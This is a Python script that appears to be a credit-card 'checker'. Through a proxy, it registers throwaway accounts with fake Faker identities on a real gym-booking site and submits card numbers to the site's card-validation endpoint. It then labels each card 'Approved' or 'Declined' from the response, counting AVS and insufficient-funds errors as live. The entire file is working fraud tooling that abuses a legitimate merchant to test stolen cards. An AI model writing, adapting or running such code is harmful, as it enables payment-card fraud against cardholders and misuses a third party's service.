import requests
import uuid
from faker import Faker
from httpx import AsyncClient

async def moneris(cc,mes,ano,cvv,proxyg):
    async with AsyncClient(verify=False,proxy=proxyg) as web:
        email = str(uuid.uuid4()) + '@gmail.com'
        password = str(uuid.uuid4())
        fake = Faker()

        headers = {
            'accept': 'application/json, text/javascript, */*; q=0.01',
            'accept-language': 'es-ES,es;q=0.9,en;q=0.8',
            'cache-control': 'no-cache',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            # 'cookie': 'rememberme=off; PHPSESSID=ms97mvb39g103c0u9aqsu0589r; AWSALBCORS=srgjm4YGHMDR/24cl8tiF198GzkQhsioNQiuQnKBlEy/VojsOZB6z1mdVSlXCUOHKl23Zt+M5qkZ94ef3eiVGZWQHIdRmjOTXV0WbpBCea2Mg+5ma4MjjstxVA0+',
            'origin': 'https://my.rhinofit.ca',
            'pragma': 'no-cache',
            'priority': 'u=1, i',
            'referer': 'https://my.rhinofit.ca/cal/a6c9c98b?wmode=opaque',
            'sec-ch-ua': '"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
            'x-requested-with': 'XMLHttpRequest',
        }

        params = {
            'hash': 'a6c9c98b',
        }

        data = {
            'u_username': email,
            'u_username_verify': email,
            'u_password': password,
            'u_password_verify': password,
            'u_first': fake.first_name(),
            'u_last': fake.last_name(),
            'u_address1': fake.street_address(),
            'u_address2': '',
            'u_city': fake.city(),
            'u_country': 'United States',
            'u_state': 'NJ',
            'u_zip': fake.zipcode(),
            'u_phone1': fake.phone_number(),
            'u_phone2': fake.phone_number(),
            'u_emergency_name': '',
            'u_emergency_phone': '',
            'u_birthday': '',
            'u_gender': 'm',
            'num': cc,
            'exp_month': mes,
            'exp_year': ano,
            'state_is_visible': 'false',
            'action': 'validatenewusercc_v2',
        }

        req3 = await web.post('https://my.rhinofit.ca/forms/memberutils.php', params=params, headers=headers, data=data)
        if "Account is setup" in req3.text:
            status = "Approved ✅"
            mensaje = "Charged $0.00"
        else:
            mensaje = req3.text.split('{"error":"Error validating card:')[1].split('"}')[0]
            if "AVS" in mensaje:
                status = "Approved ✅"
            elif "Insufficient funds" in mensaje:
                status = "Approved ✅"
            else:
                status = "Declined ❌"
        return status,mensaje
